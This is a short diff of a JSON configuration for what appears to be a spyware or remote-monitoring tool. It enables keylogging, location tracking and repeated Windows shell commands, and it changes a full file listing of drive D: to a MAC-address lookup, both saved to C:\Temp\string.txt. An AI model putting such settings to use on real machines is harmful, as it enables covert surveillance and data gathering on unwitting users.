@@ -18,6 +18,6 @@
   "keyLog": true,
   "_pcCurrentLoc": true,
   "reloadconfigFile": true,
-  "_cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string.txt\""],
+  "_cmdCommandsList": ["getmac >> \"C:\\Temp\\string.txt\""],
   "repeatCmdCommands": true
 }
